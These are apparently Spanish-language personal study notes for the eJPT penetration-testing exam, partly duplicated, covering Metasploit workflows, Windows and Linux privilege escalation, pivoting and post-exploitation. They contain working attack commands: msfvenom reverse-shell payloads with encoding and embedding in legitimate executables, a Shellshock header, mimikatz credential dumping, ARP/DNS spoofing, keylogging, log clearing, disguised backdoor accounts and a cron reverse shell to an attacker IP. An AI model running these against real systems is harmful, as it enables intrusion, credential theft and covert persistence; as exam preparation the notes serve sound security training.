Notas Estudio eJPT

netcraft - Informacion del sitio web incluso SSTL/TLS
dnsrecon 
dnsdumpster
watw00f -Detectar WAF
sublist3r -Identificar subdominios
Google Dorks - 
waybackmacine - 
theHardvester - 
dnsenum -
dig - 
nmap -
	-sn (Host discovery ICMP) 
netdiscover - Host discover ARP (eth0)


hsot -De host a IP
dirsearch -Enumeracion de directorios
sitemap.xml (wordpress) o rbots.txt -Indexar sitios web
whois - Informacion del sitio web
netcraft - Informacion del sitio web incluso SSTL/TLS
dnsrecon 
dnsdumpster
watw00f -Detectar WAF
sublist3r -Identificar subdominios
Google Dorks - 
waybackmacine - 
theHardvester - 
dnsenum -
dig - 
nmap -
	-sn (Host discovery ICMP) 
netdiscover - Host discover ARP (eth0)

mysql -u User -p -h <IP>
nmap -oX - Se puede exportar los resultados de Nmap a Metasploit con un xml
	service postgresql start -Primero se dbe iniciar los servicios de Postgre
	msfconsole
	db_status -Se confirma la coneccion de Postgre con Metasploit
	
	workspace -Se debe crear un nuevo espacio de trabajo
	workspace -a NombreWorkspace
	db_import /resultadosnmap.xml
	hosts -Para comprobar si realmente se cargo el host
	services -Comproar los servicios

Se puede hacer el nmap directamente desde Metasploit
	workspace -a Nmap_MSF
	workspace
	db_nmap -Pn -sV -O <IP>
	
Encontrar host dentro de la red de la victima con Metasploit (ej: Host sin internet al que no podemos acceder directamente)
	Al explotar alguna vulnerabilidad con MSF que nos cree un interprete (Meterpreter)	
	sysinfo -Obtener información del sistema
	shell -Se puede ejecutar una shell de comandos en el host victima
	/bin/bash -i -Para iniciar una sesion bash para ejecutar comandos normalmente (Linux)
	
	run autoroute -s <Subred (192.113.124.2)> -Se agrega el otro adaptador de red de la victima (Desde Meterpreter mas no el la shell)
	
	background -Mandar las sesiones a segundo plano
	sessions -Listar las sesiones activas
	search portscan -Utilizar las herramientas de Mestasploit y usar directamente la IP de la segunda victima
	
	  
Resumen(service postgresql start, msfconsole, workspace -a Portscan_interno, search portscan, use 5, set RHOST 192.45.96.3, curl 192.45.96.3, search XODA, use 0, set RHOST 192.45.96.3, set TARGETURI /, set LHOST 192.45.96.2, exploit, shell, /bin/bash -i, ifconfig, exit, run autoroute -s 192.194.183.2, bg, sessions, search portscan, use 5, set RHOSTS 192.194.183.2)	

__

Modulos MSF - search type:auxiliary name:
	ftp enum 
	smb shares
	http version, http header
	mysql version, login, enum, schemadump
	ssh version, login, enumusers(userfile), openssh
	smtp version, enum, 

HTTrack -descargar toda la pagina web

Herramienta Automatizacion de explotación con Metasploit (Hay que haber iniciado PostgreSQL, workspace y db_nmap)
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo mv db_autopwn.rb /usr/share/metasploit-framework/pluguins/
msf6> load db_autopwn
db_autopwn -p -t -PI <Port>

Analyzer - Herramienta de análisis de exploits listos para probar (Hay que haber iniciado PostgreSQL, workspace y db_nmap)
msf6> analyze
           vulns


Pentest WebDav (Extension del protocolo HTTP que permite el desarrollo web comunitario, donde usuarios pueden descargar, cargar o eliminar contenido - Suele estan en un IIS o en Apache)
	davtest -auth user:password -url http://<IP>/webdav -Permite conocer que tipos de archivos se pueden ejecutar, cargar etc (GET, PUT, PUSH)
	cadaver http://<IP>/webdav -Permite ejecutar las acciones enumeradas con davtest (ej: para cargar shells /usr/share/webshells/ asp/webshell.asp)

mysql -u User -p -h <IP>
nmap -oX - Se puede exportar los resultados de Nmap a Metasploit con un xml
	service postgresql start -Primero se dbe iniciar los servicios de Postgre
	msfconsole
	db_status -Se confirma la coneccion de Postgre con Metasploit
	
	workspace -Se debe crear un nuevo espacio de trabajo
	workspace -a NombreWorkspace
	db_import /resultadosnmap.xml
	hosts -Para comprobar si realmente se cargo el host
	services -Comproar los servicios

Se puede hacer el nmap directamente desde Metasploit
	workspace -a Nmap_MSF
	workspace
	db_nmap -Pn -sV -O <IP>
	
Encontrar host dentro de la red de la victima con Metasploit (ej: Host sin internet al que no podemos acceder directamente)
	Al explotar alguna vulnerabilidad con MSF que nos cree un interprete (Meterpreter)	
	sysinfo -Obtener información del sistema
	shell -Se puede ejecutar una shell de comandos en el host victima
	/bin/bash -i -Para iniciar una sesion bash para ejecutar comandos normalmente (Linux)
	
	run autoroute -s <Subred (192.113.124.2)> -Se agrega el otro adaptador de red de la victima (Desde Meterpreter mas no el la shell)
	
	background -Mandar las sesiones a segundo plano
	sessions -Listar las sesiones activas
	search portscan -Utilizar las herramientas de Mestasploit y usar directamente la IP de la segunda victima
	
	  
Resumen(service postgresql start, msfconsole, workspace -a Portscan_interno, search portscan, use 5, set RHOST 192.45.96.3, curl 192.45.96.3, search XODA, use 0, set RHOST 192.45.96.3, set TARGETURI /, set LHOST 192.45.96.2, exploit, shell, /bin/bash -i, ifconfig, exit, run autoroute -s 192.194.183.2, bg, sessions, search portscan, use 5, set RHOSTS 192.194.183.2)	

__

Modulos MSF - search type:auxiliary name:
	ftp enum 
	smb shares
	http version, http header
	mysql version, login, enum, schemadump
	ssh version, login, enumusers(userfile), openssh
	smtp version, enum, 

HTTrack -descargar toda la pagina web

Herramienta Automatizacion de explotación con Metasploit (Hay que haber iniciado PostgreSQL, workspace y db_nmap)
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo mv db_autopwn.rb /usr/share/metasploit-framework/pluguins/
msf6> load db_autopwn
db_autopwn -p -t -PI <Port>

Analyzer - Herramienta de análisis de exploits listos para probar (Hay que haber iniciado PostgreSQL, workspace y db_nmap)
msf6> analyze
           vulns


Pentest WebDav (Extension del protocolo HTTP que permite el desarrollo web comunitario, donde usuarios pueden descargar, cargar o eliminar contenido - Suele estan en un IIS o en Apache)
	davtest -auth user:password -url http://<IP>/webdav -Permite conocer que tipos de archivos se pueden ejecutar, cargar etc (GET, PUT, PUSH)
	cadaver http://<IP>/webdav -Permite ejecutar las acciones enumeradas con davtest (ej: para cargar shells /usr/share/webshells/ asp/webshell.asp)
	

Se pueden importar los resultados de un escaneo de nessus, ya que se obtiene un XML
	postgresql, msfconsole, workspace
	db_import /ruta/nessus.xml
	vuln -p <Puerto especifico>
	search cve:2017 name:smb

Escaner web integrado en Metasploit
	postgresql, msfconsole, workspace
	msf> load wmap
	wmap
	wmap_sites -a IP -Escaner de sitios web
	wmap_targets -t http://IP
	wmap_run -t
	wmap_vulns -l

Escalar privilegios windows con Token (a gtravez de explotar un archivo regeto de http-file server)
	search rejetto
	payload reversetcp
	
	sysinfo
	grep explorer --> migrate 3512
	getuid
	getprivs -- Cuenta de bajos privilegios
	
	Se evidencia en la respuesta el privilegio de: SeImpersonatePrivilege -Permite adquirir los privilegios de otros usuarios (con sus tokens)


	load incognito - No se para que
	se ejecuta nuevamente el exploit - No se porque
	load incognito - Sigo sin saber
	2list_tokens -u
	Uno de los tokens de acceso es el de Administrador 
	impersonate_token "Nombre del token\Administrador"
	pgrep explorer
	migrate 31534
	getprivs

	En caso de no encontrar token de suplantacion o impersonacion disponibles, se debe usar el potato atack

Alternate Data Streams (ADS) es un atributo de los NTFS (new tecnology file system)
	Carga de payloads en los metadatos de un archivo
	

Los hash de los usuarios estan en el archivo SAM (Security Administrator Manager) -Este archivo no puede ser copiado mientras windows se eeste ejecutando
Ademas se necesita una cuenta de altos privilegios para volcar los hashes 

Unattended Windows Setup - Se usa cuando se quiere instaar windows en muchas maquinas al mismo tiempo
Tiene dos archivos que contienen credenciales - Altamente vulnerable
	C:\\Windows\Phanter\Unattended.xml
	C:\\Windows\Phanter\Autounattended.xml
Se explota a travez de metasploit: msfvenom p windows/x64/meterpreter/reverse_tcp LHOST=MiIP LPORT=Port -f exe > payload.exe
Se monta unservidor python -m SimpleHTTPServer 80
Se traen los archivos de kali desde Windows: certutil -urlcache -f http://IP/payload.exe

	postgresql, msfconsole, use multi_handler, set pauload	windows/x64/meterpreter/reverse_tcp, set RHOST, RPORT ..
	
	meterpreter> search -f Unattended.xml or cd C:\\Windows\Phanter\
	download Unattend.xml
	psexec.py Administrator@IP -- Luego passwod

Volcar Hashes, a travez de una cuenta de altos privilegios y los captura a travez de LSA
	Primero se debe obtener una sesion
	getuid
	grep lsass --> 78
	migreate 788
	getuid --> Ya se tendria la cuenta de administrador

	load kiwi (Similar a mikatz)
	? --> lsa_dump_sam --> Da los hashes NTLM
	creds_all
	lsa_dump_secrets

	En el caso de usar mimikatz hay que subir el archivo
	upload /urs/shares/windows-resources/mimikatz/x64/mimikatz.exe 
	shell
	.\mimikatz.exe
	privilege::debug
	ldump_sam
	lsa_dump::secrets
	
	sekurlsa::passwords

Ataque Pass-The-Hash a travez de Hash NTLM con pxsec.py
	Ya con kiwi o con mimikatz y con la cuenta de administrador se extraen los hashes a travez de lsa
	lsa_dump_sam
	hashdump --Entrga usuarios, LM Hash y NTLM Hash
	cntrl z
	search psexec -cambiar puerto (mismo que la session 1)
	


EXPLOTACION LINUX

ShellShock - Es la mas conocida y es una vulnerabilidad que involucra a Apache y Bash, donde a travez de una peticion CGI se hacen peticiones bash
	Se puede capturar la peticion de CGI vulnerable (comandos bash) con Burpsuite
	User-Agent:  () { :; }; echo; /bin/bash -c 'cat /etc/passwd'

Verificar exploits de Nmap ls -al /usr/share/nmap/scripts | grep ftp-*

Se pueden detectar vulnerabilidades a nivel de kernel Linux con linux-exploit-suggester

Ya descargado el Linux exploit suggester, dentro de la maquina victima con bajos privilegios
Se va a la carpeta temp, y se carga el archivo 
	upload suggester.sh
	shell
	ls
	chmod +x suggester.sh
	ls -laps -Se verifica que se tengan los permisos de ejecucion
	.\suggester.sh
	
Algunos exploits necesitan el compilador GCC
	sudo apt-get install gcc


Explotar Misconfigured CronJobs
	Son trabajos que se repiten a cierta hora o en cierto momento especifico
	Cuando son creados por un usuario con privilegios estos jobs se van a ejecutar con privilegios, pero si este archivo de jobs tiene permisos mal configurados podria permitir editarlos cualquier usuario y los jobs se ejecutaran con permisios altos

	crontab -L -- indica si hay algun cronjob programado por root
	grep -rnw /urs -e "/home/student/message" -- Es un archivo con cronjobs, y creo que esta buscand donde esta o si tiene algun otro archivo que si se puede ejecutar (ya que en este caso esta dentro de root)
	
	En caso de no tener un editor de texto, se pueden modificar archivos con printf
	printf '#!/bin/bash\necho "studen ALL=NOPASSWD:ALL" >> /etc/sudoers > /urs/local/share/copy.sh
	

Explotando Binarios SUID (Set Owner ID)
	Son scripts o archivos que un usuario sin privilegios puede ejecutar un scripts con permisos de usuario- Son permisos SUID 
	./welcome - Ejecuta el script
	file welcome - Muestra informacion del archivo (Interprete es algo relevante)
	strings welcome - Que cadenas se pueden identificar dentro dek archivo
	rm greetings - Es un archivo al cual el script le hacia el llamado, asi que se borra y se reemplaza
	cp /bin/bash greetings - Basicamente crea otro archivo
	./wellcome --Hace el llamado a bin bash con permisos de root, y ya se tiene acceso


Dumping Linux Password Hashes
	/etc/shadow - Es la carpeta que contiene las credenciales de los usuarios hasheadas (Fijarse en $numero), solo desde una cuenta de altos privilegios
	search linux/hather/hashdump -- Crackeo automatico de hashes (A travez de session 1 o 2)


NETBIOS Y SMB
SMB: Protocolo para compartir archivos y comunicarse con impresoras etc
NetBios: Protocolo antiguo para compatibilidad, y determinar host (Solo funciona en LAN)

	Enumerar NetBios 
	> nbtscan IP_subnet.0/24 - Enumera los nombres de los host BIOS de red

NETBIOS Y SMB
SMB: Protocolo para compartir archivos y comunicarse con impresoras etc
NetBios: Protocolo antiguo para compatibilidad, y determinar host (Solo funciona en LAN)

	Enumerar NetBios 
	> nbtscan IP_subnet.0/24 - Enumera los nombres de los host BIOS de red
	nmblookup -A IP
	nmap -sUV -T4 --script=nbstat.nse -p137 -pn -n IP
	Al final obtiene el nombre del servicio con un escaneo normal
	--script=smb-enum-users.nse -Informacion de las cuentas smb
	Se usa hydra para encontrar las contraseñas de los usuarios enumerados
	psexec administrator@IP -Se inicia una sesion con privilegios de usuario (O con msf)
	SIEMPRE VERIFICAR EL PAYLOAD
	
	Se verifica que pueda hacer ping a la otra maquina a la cual se va apivotear
	
	msf> run autoroute -s IP/24 -Agrega toda la subred
	nano /etc/proxychains4.conf -Donde esta "socks4 127.0.0.1 9050"
	search socks_proxy
	set VERSION 4
	set SRVPORT 9050 --Puerto del Proxy configurado
	netstat -antp -Se verifica que el puerto esta escuchando
	
	proxychains nmap IP -sTV -Pn -n -p445 -Se envia el escaneo a travez de la victima 1
	net view IPVictima2
	
	meterpreter> migrate -N explorer.exe
	shell
	net view IPVictima 2 --Permite ver los recursos compartidos
	net use D: \\IPVictima2\Documents
	net use K: \\IPVictima2\K$ -yA QUE SON DISCOS
	dir D: o dir K:	
	



Pentest SNMP - Es un servicio que gestiona y monitorea dispositivos de red - Obtiene informacion y alertas de fallos

	nmap -sUV -p 161 --script=snmp-brute IP - Enumera comunidades
	snmpwalk -v 1 -c public IP -Descarga todos los datos o mejor usar --script=snmp*	
	Puede entregar mucha informacion, incluso usuarios con los cuales podriamos intentar autenticarnos en otros servicios (smb) con hydra
	

SMB Relay Attack
	msf> smb_relay
	SRVHOST MiIP
	LHOST MiIP
	SMBHOST IPVictica

	echo "172.16.5.101 *.sportsfod" >dns -Luego se crea un archivo DNS simple que siempre apunte a nuestra IP
	dnsspoof -i eth1 -f dns -Se carga el archivo y se hace un DNS Spoofing
	
	echo 1 > /proc/sys/net/ipv4/ip forward -No recuerdo para que es
	arpspoof -i eth1 -t 172.16.5.5 172.16.5.1 - Se suplantara el ARP de la primera IP y la puerta de enlace es la segunda IP
	exploit


_________
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
search http_login (AUTH_URI)
target1.ine.local http-get /
dirb http://target1.ine.local -u bob:password_123321
cadaver
dir C:\
type C:\flag2.txt

_________
search apache cgi

search libssh
set SPAWN_PTY true
strings welcome.bin

______________

mysql_Schema
ssh_enumusers

search type:auxiliary name:

Escaneo y Busqueda de vulnerabilidades automatico
db_nmap -sSV -O IP
hosts
services
wget https://  metasploit-autopwn
sudo mv db_autopwn.rb /urs/shares/metasploit-framework/plugins
> load db_autopwn
db_autopwn -p -t -PI 445 IP
analyze
vulns

load_wmap
wmap_sites -a IP
wmap_targets -t http://IP/
wmap_sites -l
wmap_run -t
wmao_run -e

search http_put

Crear Payloads con MSFVenom
msfvenom --list payloads
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=Port -f exe > payload.exe
msfvenom --list formats
msvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT -f elf > payload

msfvenom --list encoders
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=Port -e x86/shikata_ga_nai -f exe > payload.exe -Encodear payload
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=Port -i 10 -e x86/shikata_ga_nai -f exe > payload.exe -Encodear payload -Encodear multiples (10) veces un payload 

msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=Port -i 10 -e x86/shikata_ga_nai -f exe -x /winrar602.exe -Poner payloads en un Ejecutable Portalble
-k -Mantiene la funcionalidad original del ejecutable

Funciones Automaticas de Mestasploit
ls -la /urs/share/metasploit-framework/scripts/resource

	En un archivo .rc se hace una lista de comandos que queramos que se ejecuten uno tras otro
exploss.rc
	msfconsole
	workspace -a primero
	setg RHOSTS IP
	setg LHOST IP
	set RPOT Port
	set PAYLOAD
	use ruta/exploit
	run
msfconsole -r exploss.rc
msf> resource exploss.rc

Traer archivos desde mi host hasta la victima
certutil .urlcache -f http://IP/ruta/exploit.exe exploit.exe

________
search Microsoft SQL Server 2012
use 0
set payload windows/x64/meterpreter/reverse_tcp
shell
 cd \
 dir
 type flag.txt

cd C:\Windows\System32\config -Error
exit
getprivs
getsystem -Obtener privilegios tipo SUID
shell
cd config; type flag2.txt
dir C:\Windows\System32\*.txt /s /b
___________


Servidor FTP (VSFTPD)
search vsftpd
exploit
search shell_to_metterpreter
	set LHOST
	run
session 2 -Obtener una sesion con meterpreter de la primera sesion

Samba
search samba/is_know_pipename
check -Mirar si es vulnerable
run
cntrl z
use shell_to_meterpreter
set LHOST eht1 -Detecta la IP automaticamente
set SESSION 1
run
sessions 2

SSH SERVER 
search libssh_auth_bypass
set SPAWN_PTY true
run
sessions 1
cat /etc/*release
uname -r
cntrl z
shell_to_meterpreter

SMTP Server
search smtp/haraka
set SRVPORT
set email_to yonatan@gmail.com
set payload linux/x64/meterpreter_reverse_http
set LHOST eth1
run
sysinfo
getuid

Meterpreter
checksum md5 /bin/bash -Extraer el contenido en md5 de un archivo
ps -Procesos
migrate num -Para migrar a alguno de los procesos enumerados con "ps"
ls
shell --> /bin/bash -i
sessions -u 1 -Pasa sesiones de shell a sesiones de meterpreter



POSTEXPLOTACION WINDOWS
En una sesion de meterpreter ya dentro de el host victima

sysinfo
getuid
help -Documentacion sobre lo que se puede hacer

getsystem -Elevar privilegios en el host (Name Pipe Impersonation)
webcam_stream -Ejecutar comandos sobre la camara web
enumdesktops
keyscan_dump
screenshot
hasdump -Descifrar hashes en SAM
show_mount -Verificar los discos
ps -procesos activos
migrate 222 -No se que sea especificamente, pero migra a otras aplicaciones ? con diferentes privilegios

search upgrade platform:windows
search migrate 
search win_privs
	set SESSION 1
search enum_logged_on_users
search checkvm -Verificar si el objetivo es una vm
search enum_applications
loot -Acceder a los datos cuando se almacenan en una instancia de metasploit (no se muestran en pantalla, sino que se guardan directamente)
search enum_av_excluded -Se excluyen las restricciones qye evitar eumerar totos los archivos bloqueados por anti virus
search enum_computer
search enum_patches -Enumerar parches aplicados al sistema
meterpreter> systeminfo -Enumeracion manual
set enum_shares
search enable_rdp -Verificar si esta disponible el Remote Desktop Protocol



























haz lo mismo pero con esto:
Elevar Privilegios Bypass UAC (User Access Control - Impersonation) -Quieres que esta aplicacion haga cambios en el sistema
getsystem -En una session de meterpreter
search bypassuac - injection (Bypass en memoria)
hashdump -Volvado de hashes, solo se puede con una cuenta de administrador

Token Impersonatio con Icognito - Escalar privilegios
meterpreter> load incongnito 
list_tokens -u
impersonate_token "Nombre\Token"
hasdump -Falla porque necesitamos igrar a un proceso con el token (permisos) de administrador
migrate 3344
hasdump

PERSISTENCIA

Persistencia e Windows

search platform:windows persistence_Service
set payload windos/x64/meterpreter/reverse_tcp
set SESSION 1
search multi/handler
set LHOST, set PAYLOAD windos/x64/meterpreter/reverse_tcp
exploit -Ya teniendo un multi handler corriendo, se va a poder ejecutar el meterereter unicamente corriendo el multi/handler (se inicia siempre con el mismo payload, mismo Lport y run)

Habilitar RDP en host vulnerado
search enable_rdp
net user administrator nuevapassword123 -Cambiar la contraseña , desde una cuenta con mas altos privilegios


Windows KeyLogin - Capturar las teclas presionadas
meterpreter> keyscan_start
keyscan_dump

Limpiar Events Logs - Luego de una explotacion
meterpreter> clearev
rm archivo.txt


PIVOTING
Hay que haber vulnerado a la victima 1 para poder pivotear a la victima 2 
ipconfig -Identificar Subnet
run autoroute -s SubnetComunVictima2/20
search portscan/tcp -Los escaneos que se pueden hacer a la victima 2 son los que estan en metasploit y ya

Reenvio de Puertos
meterpreter> portfwd add -l PuertoLocal -p PuertoVictima2 -r IPVictima2
ej: db_nmap -sSV -p PuertoLocal localhostIP

Se puede hacer una explotaacion al puerto de la victima 2
set RHOST IPVictima2
set RPORT PuertoRealVictima -Ejemplo si se hizo el portforwarding del 80 (victima2) a 1234 (local), el esacaneo se haria sobre el 80 hacia la IP victima 2
sessions -Deben estar las sesiones de las 2 victimas



POST EXPLOTACION EN LINUX
Explotar y acceder a host Linux
cntrl z
session -u 1 -Darle una interfaz de meterpreter
sessions 2 -Session 1 pero con meterpreter
shell --> /bin/bash -i
cat /etc/passwd
groups root -Usuarios del grupo root
cat /etc/*issue -Version de Linux
uname -r -Version del kernel Linux
uname -a 
ifconfig - ip a s
netstat -antp -Puertos abiertos
ps aux -Procesos corriendo
/tmp# env -Enumerar variables de entorno

Modulos Postexplotacion
search enum_configs -Enumera todos los posibles archivos vulnerables
loot -Ver toda la informacion guardad en el Workspace de Postgresql - El cual guarda los archivos enumerados - cat /etc/..../data.config
use multi/gather/env
use linux/gather/enum_networks
searc enum_protections -Enumerar los mecansmos de seguridad, y protocolos seguros --> notes
search enum_system -Enumera todo lo posiblemente vulnerable en Linux
loot -Ver todo lo enumerado

search checkcontainer -Verificar si el Linux esta en un contenedor (ej: Docker)
search checkvm
search enum_users_history -Obtener el historial de comandos bash del usuario


ESCALADA DE PRIVILEGIOS EN LINUX

ps aux -Ver procesos en ejecucion en busca de aplicaciones vulnerables (ej: chkrootkit)
chkrootkit -V -Revisar version si es vulnerable
msf> search chkrootlit

PERSISTENCIA E LINUX

Dumpeo de Hashes
search hashdump
/tmp# passwd root --> NuevaContraseña
useradd -m newuser -s /bin/bash	
/tmp# passwd newuser --> NuevaContraseña

Crear cuenta para Backdooor
useradd -m ftp -s /bin/bash -Un usuario que para la victima paresca algo normal
passwd ftp
usermod -aG root ftp -Se agrega el usuario ftp al grupo root para que tengan los mismos privilegios
grops ftp -Verificar grupo
usermod -u 15 ftp -Ocultar ID que revela que la cuenta se creo recientemente

search platform:linux persistence
use cron_persistence
use service_peristence
set payload cmd/unix/reverse_python
use sshkey_perseistence -La forma mas efectiva de persstencia, sin cambiar claves
	set CREATESSHFLDER true
	set SESSION n
	loot - cat sshkey.txt (el nombre aparece al ejecutar el exploit)
	kali# ssh -i ssh_key.txt root@IPVictima


Vulnerabilidades con Nmap

nmap -sSV -p80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" IP

Netcat

certutil -urlcache -f http://MiServidor/nc.exe nc.exe -Descargar el netcat en maquina victima
Oyente: nc -nvlp 1234
Cliente: nc -nv 1234

arp-scan -I eth0 --localnet -Ver las maquinas que estan en el alncance

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP

smbmap -H IP -Enumerar recursos compartidos
smbmap -H IP -r IPC$
smbmap -H IP --download IPC$/flag.txt
smbmap -H IP -u user -p password -r IPC$

OpenSSG - User Enumeration (https://youtu.be/L1jSoCcvRY4?t=1504)
	python2 ssh_enum_users.py IP Usuario 2>/dev/null -Funciona?

search smtp_enum -Sirve para enumerar usuarios en servicios smbtp (puerto 25)

Evasion de AntiVirus con Sheller - Cambiar los bits e IoC asociados
	sudo apt install shellter -y
	sudo dpkg --add-architecture i386
	sudo apt install wine32 -Para ejecutar .exe en Linux
	cd /user/share/windows.resources/shellter
	sudo wine shellter.exe
A -Automatico
/ruta/archivo/legitimo/vncviewer.exe
Y -Dejar que la aplicacion funcione normalmente
L
1 -Se selecciona el payload

msf>use multi/handler
set payload windows/meterpreter/reverse_tcp -Mismo que en el sheller


Ofuscar Codigo PowerShell -Reorganizar codigo

	Descargar el repositorio de Invoke-Obfuscation
	
	sudo apt install powershell -y -Instalar powershell en Linux
	powershell
	Invoke-Obfuscation

POSTEXPLOTACION

Enumeracion de informacion Windows

meterpreter> systeminfo -Obtener SO, Version, HotFixes, Networks, etc
wmic qfe get Caption,Description,HotFixID,InstalledOn -Lista de los parches aplicados

Enumeracio usuarios y grupos
getprivs -Ver los privilegios asociados a la cuenta de usuario
search logged:on_users
query user -Verificar quien mas esta en la sesion
net users -Usuarios en el sistema
net user Administrator -Enumerar informacion sobre un usuario especifico
net localgroup
net localgroup Administrators

Enumerar Network Information
meterpreter> shell
ipconfig
ipconfig /all
route print
arp -a -Ver todos los dispositivos en la red
netstar -ano -Puertos abiertos
netsh firewall stare -Firewall activo
netsh advfirewall
netsh advfirewall show all profiles



































continua con estos:
Enumerar Sesiones y Procesos
metasploit> ps -Listar procesos y usuarios asignados (Depende de los privilegios del usuario)
pgrep explorer.exe -Llama al id del proceso - Se recomienda siempre migrar a explorer.exe
migrate 2176
net start -Servicios de Windows
wmic service list brief -Lista de todos los servicios
rasklist /SVC -Servicios que se ejecutan sobre algun proceso
schtask /quert /fo LIST /v -Tareas programadas

ENUMERAR TODAS LAS ETAPAS DE ENUMERACION DE WINDOWS

search win_privs -Proporciona algo de informacion
search enum_logged -Cuentas que iniciaron sesion
search checkvm -Verificar si se esta en una maquina virtual
search enum_applications -Enumera aplicaciones instaladas
search enum_computers -ENUMERA LOS COMPUTADORES EN LA MISMA RED
search enum_patches -Enumera los parches aplciados en el host
search enum_shares -Busca recursos compartidos

JAWS -Just Another Windows (Enum) Script
jws-enum.ps1
upload /root/Desktop/jsw-enum.ps1
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
meterpreter> download JAWS-Enum.txt


ENUMERAR INFORMACION DEL SISTEMA EN LINUX

meterpreter> sysinfo --> shell
bin/bash -i
hostname -Nombre del usuario
cat /etc/issue -Version del SO
cat /etc/*release -Version especifica de la distribucion
env -Variables del usuario raiz
lscpu -Informacion del procesador
df -h -Discos conectados al sistema
dpkg -l -Ver todas las herramientas y utilidades instaladas

ENUMERAR USUARIOS Y GRUPOS LINUX

getuid -Si todos estan en 0, es que se tienen los privilegios mas altos
whoami -Usuario
groups root(usuario)
cat /etc/passwd -Shell relacionada a procesos y usuarios
cat /etc/passwd | grep -v "nologin"
groups
last -Ultima vez que se inicio sesion
lastlog -Cuando se logearon cada usuario

Enumerar Informacion de Red
meterpreter> ifconfig
netstat -Servicios tcp activas con puertos y IPs locales
route -Tabla de enrutamiento
cat /etc/hosts
localhost
cat /etc/resolv.conf
meterpreter> arp -Lista ARP
	ps -Ver procesos activos
ps aux
top
crontab- -l -listar los cronjobs activos o configurados
ls -la /etc/cron*

Enumeracion Automatica de Linux
search enum_configs
search enum_network
search enum_system
search checkvm
Usar LINENUM -Para hacer una enumeracion completa

Transferir Archivos sin Meterpreter
python3 -m http.server 80
Abrir la IP donde esta el servidor IP:80

En windows -- certutil -urlcache -f http://IP/exploit.exe exploit.exe
.\exploit.exe
lsadump::sam -En mimikats

En Linux - wget http://IP/exploit.sh

Convertir una shell en una shell interactiva
cat /etc/shells -Se enumeran las shells disponibles ya que podria no tener Bash
python --version -Para verificar si esta instaldo python
python -c 'import pty: pty.spawn("/bin/bash")' -Para obtener shell Bash a traves de Python
perl --help -Verificar quye Perl este instalado
perl -e 'exec "/bin/bash";'
ruby: exec "/bin/bash"
perl: exec "/bin/bash";
/bin/bash -i
export PATH=/usr/local/sbin:/ust/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
env 
export TERM=xterm
export SHELL=bash
env

ls -alps
top
wget

ESCALADA DE PRIVILEGIOS EN WINDOWS

search web_delivery
set target PSH\ (Binary) -Powershell es la target
set payload windows/shell/reverse_tcp
set PSH EncodedCommand false -Para encodear el script que ejecutara en powershell
set LHOST eth1
exploit
-Esto nos entrega un comando de Powershell, el cual al ejecutar en el host victimase crea una shell en msf, la cual se puede upgradear con session -u 1 o con:
search shell_to_meterpreter
set SESSION 1
show advanced -Ver opciones adicionales
set WIN TRANSFER VBS
exploit

migrate 3626 -Se migra a explorer.exe, para tener estabilidad
cd /ruta/Desktop -Debemos tener el PrivescCheck.ps1 "https://github.com/itm4n/PrivescCheck/blob/master/PrivescCheck.ps1" - Donde se muestran varias opciones dependiendo del acceso que se tenga en la maquina victima
powershell -ep bypass .\script.ps1 -Saltar la politica de ejecucion de comandos
-En este caso se lograron encontrar contraseñas guardadas de administrador
psexec.py Administrator@IP
whoami /priv

msf> search windows/smb/psexec
set PAYLOAD 	 


ESCALADA DE PRIVILEGIOS EN LINUX (Malas configuraciones)

whoami
cat /etc/passwd
groups
cat /etc/group
groups usuario
find / -not -type l -perm -O+W -Enumerar archivos que pueden ser modificados por cualquier usuario ej: /etc/shwadow
ls -la /etc/shadow -Confirmar los permisos que se tienen
openssl passwd -1 salt abc Password -Crear una contraseña co hasheado valido para cargar en el etc/shdows

sudo -l -Enumerar los permisos de binarios ej: (root) NOPASSWD: /urs/bin/man

man ls -Pagina de comandos
sudo man 
!/bin/bash -Agregando esto hace que el archivo que se podia abrir con privilegios y sin contraseña se ejecute, en este caso tiene una sesion bash



PERSISTENCIA EN WINDOWS

search persistence -Se necesitan permisos de administrador para poder usar este modulo
set PAYOAD default (windows/meterpreter/reverse_tcp)

Iniciar nuevamente la session, aunque sea luego de cerrarla
search multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST eth1
set LPORT (MismoPuerto que con "persistence")
exploit -Se abre automaticamente al detectar que el puerto esta escuchando con el payload especifico y el host especifico

Persistencia via RDP - Creando una nueva cuenta de usuario en el grupo de administradores (Hay que ser administrador)
pgrep explorer.exe
migrate 3344
run getgui -e -u Nombre -p Password123 -Crea el usuario, activa el puerto RDP, evade el firewall, evita que sea visible e usuario y lo agrega al grupo del administrador

xfreerdp3 /u:Nombre /p:Password123 /v:IP


PERSISTENCIA EN LINUX

Persistencia con claves SSH

scp usuario@IP:~/.ssh/id_rsa . -scp es una funcionalidad que permite traer archivos de una maquina victima a la nuestra 
chmod 400 id_rsa  
-Se vuelve a iniciar el ssh pero ingresando la llave priavada

Permanencia con CronJobs

cat /etc/*cron
echo "* * * * * /bin/bash -i -c'bash -i >& /dev/tcp/IPMia/Port 0&1'" > cron -Crear un cronjob que se ejecute todo el tiempo
crontab -i cron -Agregar cron a los cronjobs, para acceder con los permisos actuales
crontab -l -Ver los cronjobs activos

nc -nvlp Port


DUMPING Y CRACKING DE HASHES NTLM (Volcar y Descifrar)

Dentro de una sesion
pgrep lsass -Ya que este es el proceso que se va a explotar
migrate 1234
hashdump -Se obtienen los hashes NTLM de los usuarios del sistema
net users -Enumerar usuarios
jhon -Decfrar con jhon the ripper o hashkat

Linux
search linux/gather/hashdump -Para extraer los hashes



PIVOTING

Primero se explota el objetivo inicial, idealmente teniendo una sesiond meterpreter
